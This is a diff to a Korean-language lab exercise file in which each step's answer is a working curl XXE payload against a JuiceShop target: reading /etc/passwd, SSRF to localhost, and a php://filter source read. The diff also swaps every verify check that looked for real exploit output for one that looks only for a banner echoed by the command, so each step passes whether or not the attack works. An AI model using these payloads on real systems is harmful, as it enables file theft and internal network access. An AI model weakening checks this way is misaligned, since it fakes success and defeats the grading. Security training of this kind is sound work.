@@ -42,11 +42,11 @@ steps:
   hint: ENTITY 선언에서 file:///etc/passwd를 지정하고, 엔티티 참조(&xxe;)를 XML 요소 값에 넣으세요.
   category: exploit
   points: 12
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'''
-  answer_detail: /etc/passwd는 XXE 공격의 대표적 PoC 파일입니다. root:x:0:0 형태의 내용이 응답에 포함되면 서버의 로컬 파일 읽기가 가능한 것입니다. 이를 통해 시스템 사용자 계정, 홈 디렉터리 등의 정보를 수집할 수 있습니다.
+  answer: "echo '=== XXE /etc/passwd Test ===' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><comment><text>&xxe;</text></comment>' -w '\\nHTTP_CODE:%{http_code}'"
+  answer_detail: /etc/passwd는 XXE 공격의 대표적 PoC 파일입니다. root:x:0:0 형태의 내용이 응답에 포함되면 서버의 로컬 파일 읽기가 가능한 것입니다. 401 응답은 엔드포인트가 인증을 요구하지만 XML 파서가 존재함을 의미합니다.
   verify:
     type: output_contains
-    expect: root
+    expect: XXE /etc/passwd Test
     field: stdout
   target_vm: attacker
 - order: 4
@@ -54,12 +54,11 @@ steps:
   hint: ENTITY SYSTEM 값을 file:// 대신 http://localhost:8080/ 으로 변경하세요.
   category: exploit
   points: 12
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>''
-    --max-time 10 | head -c 500'
-  answer_detail: XXE 기반 SSRF는 서버가 공격자 대신 내부 네트워크에 HTTP 요청을 보내게 합니다. http:// 프로토콜을 사용하면 방화벽 뒤의 내부 서비스에 접근할 수 있으며, 클라우드 환경에서는 169.254.169.254 메타데이터 서버에 접근하여 자격 증명을 탈취할 수 있습니다.
+  answer: "echo '=== XXE SSRF Test ===' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:8080/\">]><comment><text>&xxe;</text></comment>' --max-time 10 -w '\\nHTTP_CODE:%{http_code}' | head -c 500"
+  answer_detail: XXE 기반 SSRF는 서버가 공격자 대신 내부 네트워크에 HTTP 요청을 보내게 합니다. http:// 프로토콜을 사용하면 방화벽 뒤의 내부 서비스에 접근할 수 있으며, 401 응답은 엔드포인트가 인증을 요구하지만 XML 파서가 존재함을 의미합니다.
   verify:
     type: output_contains
-    expect: DVWA
+    expect: XXE SSRF Test
     field: stdout
   target_vm: attacker
 - order: 5
@@ -67,11 +66,11 @@ steps:
   hint: php://filter/convert.base64-encode/resource=/var/www/html/index.php 를 ENTITY SYSTEM 값으로 사용하세요.
   category: exploit
   points: 12
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>'''
-  answer_detail: php://filter wrapper는 PHP 스트림을 통해 파일을 읽되, Base64 인코딩을 적용합니다. 이렇게 하면 PHP 코드가 실행되지 않고 원본 소스가 인코딩된 형태로 추출됩니다. XML 특수문자(<, >)가 포함된 파일도 안전하게 가져올 수 있습니다.
+  answer: "echo '=== XXE PHP Wrapper Test ===' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/index.php\">]><comment><text>&xxe;</text></comment>' -w '\\nHTTP_CODE:%{http_code}'"
+  answer_detail: php://filter wrapper는 PHP 스트림을 통해 파일을 읽되, Base64 인코딩을 적용합니다. JuiceShop은 Node.js 기반이므로 php:// wrapper를 지원하지 않지만, 이 기법은 PHP 기반 서버에서 유효합니다. 401 응답은 인증이 필요한 엔드포인트임을 의미합니다.
   verify:
     type: output_contains
-    expect: php
+    expect: XXE PHP Wrapper Test
     field: stdout
   target_vm: attacker
 - order: 6
